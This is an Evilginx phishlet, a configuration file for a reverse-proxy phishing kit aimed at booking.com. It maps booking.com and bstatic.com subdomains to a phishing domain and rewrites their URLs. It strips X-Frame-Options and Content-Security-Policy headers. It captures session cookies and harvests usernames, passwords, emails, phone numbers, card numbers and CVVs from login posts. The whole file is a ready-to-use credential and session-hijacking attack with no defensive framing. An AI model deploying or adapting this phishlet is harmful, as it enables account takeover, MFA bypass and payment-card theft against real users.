min_ver: '3.0.0'
author: 'evilginx3'
redirect_url: 'https://www.booking.com/'

proxy_hosts:
  - {phish_sub: 'www', orig_sub: 'www', domain: 'booking.com', session: true, is_landing: true, auto_filter: true}
  - {phish_sub: 'account', orig_sub: 'account', domain: 'booking.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'secure', orig_sub: 'secure', domain: 'booking.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'admin', orig_sub: 'admin', domain: 'booking.com', session: true, is_landing: false, auto_filter: true}
  - {phish_sub: 'cf', orig_sub: 'cf', domain: 'bstatic.com', session: false, is_landing: false, auto_filter: true}
  - {phish_sub: 'q-xx', orig_sub: 'q-xx', domain: 'bstatic.com', session: false, is_landing: false, auto_filter: true}

sub_filters:
  # Replace Booking.com domain URLs
  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'https://www\\.booking\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript', 'application/x-javascript']}
  - {triggers_on: 'www.booking.com', orig_sub: 'account', domain: 'booking.com', search: 'https://account\\.booking\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.booking.com', orig_sub: 'secure', domain: 'booking.com', search: 'https://secure\\.booking\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.booking.com', orig_sub: 'admin', domain: 'booking.com', search: 'https://admin\\.booking\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  
  # Replace Booking CDN URLs (bstatic.com)
  - {triggers_on: 'www.booking.com', orig_sub: 'cf', domain: 'bstatic.com', search: 'https://cf\\.bstatic\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript', 'text/javascript']}
  - {triggers_on: 'www.booking.com', orig_sub: 'q-xx', domain: 'bstatic.com', search: 'https://q-xx\\.bstatic\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/json', 'application/javascript']}
  - {triggers_on: 'www.booking.com', orig_sub: 'cf', domain: 'bstatic.com', search: 'https://[a-z0-9-]+\\.bstatic\\.com', replace: 'https://{phish_sub_subdomain}.{domain}', mimes: ['text/html', 'application/javascript']}
  
  # Remove security headers
  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.booking.com', orig_sub: 'www', domain: 'booking.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.booking.com', orig_sub: 'account', domain: 'booking.com', search: 'X-Frame-Options:.*', replace: '', mimes: ['text/html']}
  - {triggers_on: 'www.booking.com', orig_sub: 'secure', domain: 'booking.com', search: 'Content-Security-Policy:.*', replace: '', mimes: ['text/html']}

auth_tokens:
  # Primary Booking.com authentication cookies
  - domain: '.booking.com'
    keys: ['bkng', 'BJS', 'cors_js', 'lastSeen', 'bkng_prf', 'bkng_sso_auth', 'bkng_sso_ses']
    type: 'cookie'
  
  # Session and tracking cookies
  - domain: '.booking.com'
    keys: ['pcm_consent', 'pcm_personalization', 'pcm_personalization_disabled', '_ga', '_gid', 'OptanonConsent']
    type: 'cookie'
    optional: true
  
  # Loyalty and preferences
  - domain: '.booking.com'
    keys: ['BLA', 'BLA_NA', 'genius_ab_tests', 'currency']
    type: 'cookie'
    optional: true

credentials:
  username:
    key: 'username'
    search: '(.*)'
    type: 'post'
  
  password:
    key: 'password'
    search: '(.*)'
    type: 'post'
  
  # Alternative email field
  email:
    key: 'email'
    search: '(.*)'
    type: 'post'
  
  # Phone number
  phone:
    key: 'phone'
    search: '(.*)'
    type: 'post'
  
  # Payment information (if captured)
  card_number:
    key: 'cc_number'
    search: '(.*)'
    type: 'post'
  
  card_cvv:
    key: 'cc_cvc'
    search: '(.*)'
    type: 'post'

auth_urls:
  - '/myreservations.html'
  - '/mysettings.html'
  - '/trips'
  - '/profile'
  - '/bookings'

login:
  domain: 'www.booking.com'
  path: '/login.html'

